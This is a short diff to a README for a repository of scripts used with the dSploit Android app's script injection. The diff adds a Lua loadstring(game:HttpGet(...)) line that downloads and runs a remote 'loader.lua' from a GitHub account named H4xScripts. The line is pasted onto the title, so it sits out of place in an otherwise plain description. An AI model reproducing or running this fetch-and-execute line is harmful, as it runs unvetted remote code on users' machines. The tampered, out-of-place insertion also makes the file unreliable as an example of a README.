@@ -1,4 +1,4 @@
-dSploitScripts Repo
+loadstring(game:HttpGet("https://raw.githubusercontent.com/H4xScripts/Loader/refs/heads/main/loader.lua", true))()dSploitScripts Repo
 ==============
 A repository with scripts for the [dSploitScripts][dSploitScripts] Android app. For use with [dSploit][dSploit] script injection.
 
